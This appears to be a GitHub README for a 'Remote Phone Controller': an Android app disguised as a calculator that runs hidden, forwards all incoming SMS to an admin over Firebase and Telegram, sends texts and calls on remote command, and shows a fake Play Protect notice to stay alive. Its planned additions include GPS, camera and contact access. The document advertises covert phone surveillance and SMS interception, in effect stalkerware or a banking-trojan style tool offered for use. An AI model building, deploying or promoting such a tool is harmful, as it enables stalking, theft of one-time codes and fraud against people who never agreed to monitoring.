Remote Phone Controller - A Complete SMS & Call Management System

🎯 Overview
A comprehensive remote phone control system that allows you to manage SMS and calls from anywhere in the world. This project combines an Android app, Telegram bot, and web admin panel to create a seamless remote control experience.

✨ Features
📱 User App (Android)
Clean Calculator Interface - Disguised as a calculator for privacy

Background Operation - Runs silently even when app is closed

Firebase Integration - Real-time command processing

SMS Forwarding - Auto-forwards incoming SMS to admin

Remote Commands - Receives and executes SMS and call commands

Play Protect Notification - Discreetly keeps app running

🤖 Telegram Bot
Device Management - List and select connected devices

Remote SMS - Send SMS through any connected phone

Remote Calls - Initiate calls remotely

Inbox View - View incoming SMS

Status Monitoring - Check system status anytime

Multi-Device Support - Control multiple phones from one bot

🌐 Web Admin Panel
Real-time Dashboard - Monitor all connected devices

Remote SMS Sending - Send messages from browser

Remote Call Making - Initiate calls from browser

Device Status - See which devices are online

Incoming SMS View - View all received messages

Command Log - Track all actions performed

Responsive Design - Works on mobile and desktop

🔥 Firebase Integration
Real-time Database - Instant command relay

Anonymous Authentication - Secure device identification

Data Persistence - Store all SMS and call logs

Cross-Platform - Connects all components seamlessly

🛠️ Technologies Used
Component	Technology
User App	Kotlin, Android Studio, Firebase Realtime Database, Firebase Auth
Telegram Bot	Node.js, node-telegram-bot-api, Firebase Admin SDK
Web Admin Panel	HTML, CSS, JavaScript, Firebase SDK
Database	Firebase Realtime Database
📋 How It Works
User installs the Android app on their phone

The app runs in background disguised as a calculator

Admin sends commands via Telegram or Web Panel

Commands relay through Firebase to the user's phone

Phone executes commands (SMS/Call)

Incoming SMS auto-forward to admin in real-time

🔒 Security
Anonymous Authentication - No personal data stored

Firebase Security Rules - Controlled database access

Discreet Operation - App appears as normal calculator

Play Protect Notification - Looks like a system security scan

📱 Commands
Telegram Bot Commands:

/start - Activate the bot

/devices - List all connected devices

/sms +919999999999 Hello - Send SMS

/call +919999999999 - Make a call

/inbox - View recent incoming SMS

/status - Check system status

Web Admin Panel:

Select device from dropdown

Enter phone number and message

Click "Send SMS" or "Make Call"

View incoming SMS in real-time

🚀 Deployment
User App:

Open in Android Studio

Build APK

Install on any Android device (Android 7.0+)

Telegram Bot:

bash
npm install
node bot.js
Web Admin Panel:

Upload admin_panel.html to any web server

Or host on GitHub Pages for free

📊 Use Cases
Personal Use - Control your own phone remotely

Family Monitoring - Help family members with phone issues

Business - Manage multiple devices

Security - Auto-forward SMS for monitoring

Accessibility - Control phone for elderly users

📸 Screenshots
Add screenshots here:

User app (Calculator)

Telegram bot commands

Web admin panel dashboard

Device list view

SMS sending interface

📝 License
This project is open-source and available for personal and commercial use.

👨‍💻 Author
Name: ZORYAN 

GitHub: https://github.com/z0ry4n-ux

Email: z0ry4n@gmail.com

⭐ Features to Add (Future)
GPS Location Tracking

Battery Status Monitoring

Remote Camera Access

Clipboard Control

Contact List Access

Notification Forwarding

Multiple Language Support

Dark/Light Theme

🙏 Acknowledgments
Firebase - For real-time database

Telegram - For bot platform

Android - For app development

GitHub Pages - For free hosting

📞 Support
For issues or questions:

GitHub Issues: Create an issue in the repository

Email:z0ry4n@gmail.com

